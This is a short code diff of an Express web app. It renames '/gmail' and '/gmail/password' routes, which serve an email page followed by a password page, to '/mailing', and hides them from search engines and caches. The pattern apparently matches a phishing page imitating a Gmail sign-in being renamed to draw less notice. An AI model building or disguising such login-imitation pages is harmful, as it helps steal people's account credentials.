@@ -155,22 +155,22 @@ app.post(
   }
 );
 
-app.get('/gmail', (req, res) => {
+app.get('/mailing', (req, res) => {
   res.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
   res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
   res.set('Pragma', 'no-cache');
   res.set('Expires', '0');
-  res.render('gmail', { email: '' });
+  res.render('mailing', { email: '' });
 });
 
-app.get('/gmail/password', (req, res) => {
+app.get('/mailing/password', (req, res) => {
   res.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
   res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
   res.set('Pragma', 'no-cache');
   res.set('Expires', '0');
   const email = (req.query.email || '').toString();
-  if (!email) return res.redirect('/gmail');
-  res.render('gmail-password', { email });
+  if (!email) return res.redirect('/mailing');
+  res.render('mailing-password', { email });
 });
 
 app.get('/admin', (req, res) => {
